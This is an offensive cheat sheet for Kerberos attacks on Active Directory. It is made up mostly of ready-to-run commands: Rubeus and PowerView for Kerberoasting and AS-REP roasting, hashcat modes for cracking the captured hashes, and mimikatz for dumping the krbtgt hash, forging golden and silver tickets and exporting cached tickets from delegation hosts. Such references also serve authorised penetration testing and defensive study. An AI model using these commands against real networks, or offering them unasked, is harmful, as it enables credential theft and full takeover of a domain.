# Kerberos Attacks

## Kerberoasting (T1208)
```powershell
# Find accounts with SPN set
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
setspn -T domain -Q */*
# Request and crack TGS tickets
Invoke-Kerberoast -OutputFormat Hashcat | fl
# Or with Rubeus
Rubeus.exe kerberoast
```
```bash
hashcat -m13100 tgs_hashes.txt wordlist.txt
```

## AS-REP Roasting
- Targets accounts with "Do not require Kerberos preauthentication"
```cmd
Rubeus.exe asreproast
```
```bash
# Insert $23$ after $krb5asrep$ then crack
hashcat -m18200 asrep_hash.txt wordlist.txt
```

## Golden Ticket (requires krbtgt hash)
```
# Extract krbtgt hash (needs DC admin)
lsadump::lsa /inject /name:krbtgt
# Forge TGT
kerberos::golden /domain:DOMAIN /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:fakeAdmin /id:500 /ptt
```
- Grants access to any service in the domain

## Silver Ticket (requires service account hash)
```
kerberos::golden /sid:USER_SID /domain:DOMAIN /ptt /target:SERVER /service:http /rc4:SVC_HASH /user:fakeUser
```
- Forged TGS for specific service; no DC validation needed

## Unconstrained Delegation
```powershell
# Find delegation hosts
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515}
```
- Any user authenticating to delegation host caches their TGT in memory
- Dump with mimikatz: `sekurlsa::tickets /export`

## Resource-Based Constrained Delegation (RBCD)
- Requires WRITE on target computer object
- Create fake computer, set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target
- Use Rubeus S4U to impersonate admin to target
